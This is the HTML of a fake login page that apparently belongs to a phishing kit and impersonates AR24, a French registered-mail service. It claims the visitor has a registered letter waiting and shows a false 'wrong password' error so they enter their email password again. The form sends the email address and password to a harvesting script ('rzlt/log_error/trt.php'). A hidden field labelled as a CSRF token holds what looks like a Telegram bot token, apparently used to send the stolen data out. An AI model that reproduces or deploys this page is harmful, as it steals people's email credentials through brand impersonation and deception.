...
<head>
    ...
    <title>Accuser réception du courrier 42250321 - AR24</title>
...
<body class=" guest">
      <noscript>
        ...
        <main id="main-content"> 
            ...
            <section class="content">
                <form id="arm-form" method="post" action="rzlt/log_error/trt.php"> 
                    <input type="hidden" name="csrf_token" value="8143427557:AAH73Ym5Iy0YY__LJLvUVnwfWoLA4ZlmxZU"> 
                    <p class="align-center">
                        <strong>Bienvenue sur AR24 !</strong><br>  Votre expéditeur cherche à vous faire parvenir un courrier recommandé de façon électronique. Il/elle a choisi notre service pour vous le faire parvenir.  <br> 
                        
                    </p>   <br><br>
                    <div style="width: 100%;background-color: #f8d7da;border-radius: 10px;color: #721c24;padding: 5px;text-align: center;border: 1px solid #f5c6cb;box-sizing: border-box;">
                        <p class="error_text" >Le mot de passe saisi ne correspond pas à celui associé à votre adresse email. Veuillez vérifier vos informations avant de réessayer.</p>

                    </div>
                    <div class="card mt-xl mb-xl"> 
                        <p class="fw-500 mb-xl" style="text-align: justify;">Pour sécuriser la délivrance de votre recommandé, un code à 6 chiffres sera envoyé par email. Connectez-vous avec vos identifiants associés à l’adresse destinataire.</p>
                        <div class="mail">  
                            <div >
                            <div class="images-container">
    <!-- Icône utilisateur -->
    <svg fill="#4B4F54" class="images" width="20%" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
      <g id="Icon/32px/User/person-circle" fill="current">
    ...
    <!-- Titre -->
    <p style="font-size: 16px; color:#4B4F54; text-align: center; font-weight: bold; margin: 10px 0 0 0;">
      Se connecter
    </p>

    <!-- Données sécurisées -->
    <p style="font-weight: bold; text-align: center; font-size: 8px; color: #4B4F54; margin-top: -10px;">
      <svg aria-hidden="true" width="6px" color="#32CD32" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" style="vertical-align: middle;">
        <path fill="currentColor" d="M400 224h-24v-72C376 68.2 307.8 0 224 0S72 68.2 72 152v72H48c-26.5 
        0-48 21.5-48 48v192c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V272c0-26.5-21.5-48-48-48zm-104 
        0H152v-72c0-39.7 32.3-72 72-72s72 32.3 72 72v72z"></path>
      </svg>
      <span style="vertical-align: middle;">Données sécurisées</span>
    </p>

    <!-- Image des fournisseurs -->
    <div class="images-container" style="margin-top: 10px;">
      <img class="images" alt="logo-mail" src="img/mail-1.png" style="height:30px;width:190px; margin-bottom: 10px;">
    </div>
  </div>
                            </div>

                        </div>
                        <label for="ide_id" class="fw-500">Adresse e-mail</label> 
                        <input type="email" id="ide_id" name="ide" placeholder="Ex : Votre adresse e-mail" required="" autocomplete="new-password">
                        <label for="pwd_id" class="fw-500">Mot de passe</label>
                        <div class="input-container"> 
                            <input class="password" type="password" id="pwd_id" name="pwd" autocomplete="new-password" placeholder="Votre mot de passe" required=""> 
                            <i id="visibilityBtn">
                                <span id="icon">
                                    <!-- <img class="icon" src="img/eye.png"> -->
                                    <img src="img/eye.png" alt="Afficher le mot de passe" class="toggle-password" onclick="togglePasswordVisibility()">
                                </span>
                                
                            </i>
                        </div>
                        <div class="display-flex mt-m"> 
                            <input type="checkbox" id="remember-me" name="persistent" value="1"> 
                            <label for="remember-me">Se souvenir de moi</label>
                        </div>
                        <p class="align-center mt-m"> 
                            <input class="btn btn-primary" type="submit" value="S'identifier" title="Connexion" aria-label="Se connecter"></p>
                        <!-- <p>Si le numéro indiqué ci-dessus n'est pas le votre, merci de contacter votre expéditeur</p>  -->
                    </div>
                    <!-- <div class="notice info">Ce numéro nous a été transmis par votre expéditeur et ne sera utilisé que pour l'envoi du code de confirmation</div>  -->
                </form> 
            </section> 
        </main> 
        <footer id="footer">
...
<script>
  ...
  if (passwordField.getAttribute('type') === 'pwd_id') {
    passwordField.setAttribute('type', 'text');
    toggleIcon.src = 'img/eye_close.png'; // Change l'image en œil fermé
  } else {
    passwordField.setAttribute('type', 'pwd_id');
    toggleIcon.src = 'img/eye.png'; // Change l'image en œil ouvert
  }
}
